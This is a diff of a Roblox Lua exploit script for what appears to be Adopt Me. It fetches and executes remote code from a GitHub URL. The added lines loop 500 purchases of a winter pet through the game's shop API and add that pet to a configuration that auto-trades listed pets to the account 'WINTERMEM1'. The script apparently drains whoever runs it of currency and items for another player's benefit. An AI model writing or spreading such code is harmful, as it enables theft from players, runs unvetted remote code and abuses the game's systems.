@@ -1,9 +1,24 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Draculakemse/damnghes/refs/heads/main/uilib.lua"))()
+task.spawn(function()
+    task.wait(10)
+    for i = 1,500 do task.wait()
+        local args = {
+            [1] = "pets",
+            [2] = "winter_2024_partridge",
+            [3] = {
+                ["buy_count"] = 1
+            }
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
+    end
+end)
+wait(90)
     task.spawn(function()
         getgenv().Config = {
             ["inventory"] = "pets", -- Adapt to stickers, gifts, toys, pet_accessories, transport
             ["username"] = "WINTERMEM1",
-            ["pets_to_trade"] = {"winter_2024_bauble_buddies", "winter_2024_ratatoskr", "winter_2024_cold_cube", "winter_2024_berry_cool_cube", "winter_2024_ice_cube"} -- or lures_2023_blazing_lion cant auto trade gifts with pet ONLY 1
+            ["pets_to_trade"] = {"winter_2024_bauble_buddies", "winter_2024_ratatoskr", "winter_2024_cold_cube", "winter_2024_berry_cool_cube", "winter_2024_ice_cube", "winter_2024_partridge"} -- or lures_2023_blazing_lion cant auto trade gifts with pet ONLY 1
         }
         getgenv().trade_status = true
         getgenv().pets_unique_ids = {}
